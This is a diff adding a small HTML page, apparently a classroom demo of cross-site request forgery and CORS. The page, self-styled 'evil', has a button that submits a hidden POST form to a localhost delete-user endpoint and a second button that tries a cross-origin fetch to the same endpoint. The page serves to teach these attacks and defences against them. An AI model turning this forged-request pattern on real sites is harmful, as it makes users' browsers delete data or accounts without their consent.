@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <h1>Hello, I am the evil HTML page. I am running a background script in the background right now!!</h1>
+    <form action="http://localhost:3000/delete-user" method="POST">
+    </form>
+
+    <div>
+        <button id="csrfButton">Simulate CSRF</button>
+        <button id="corsButton">Try Access from Different CORS</button>
+    </div>
+
+    <div id="responses"></div>
+    <script >
+        const form = document.querySelector("form");
+        const responsesDiv = document.getElementById("responses");
+
+        // Function to simulate a CSRF attack
+
+        document.getElementById("csrfButton").addEventListener("click", () => {
+            form.submit();
+        });
+
+        // Function to make a cross-origin request
+        document.getElementById("corsButton").addEventListener("click", async () => {
+            // Replace with your cross-origin request logic (e.g., fetch data from a different domain).
+            // Example: fetch('https://example.com/api/data', { method: 'GET', ... })
+            // Then display the response in the responsesDiv.
+
+
+            try {
+                const response =  await  fetch('http://localhost:3000/delete-user')
+                return await response.json()
+            } catch (error) {
+                console.log(error);
+              responsesDiv.innerText = error + 'see the console of the inspect this is cors error   '
+            }
+
+
+            
+        });
+    </script>
+</body>
+
+</html>
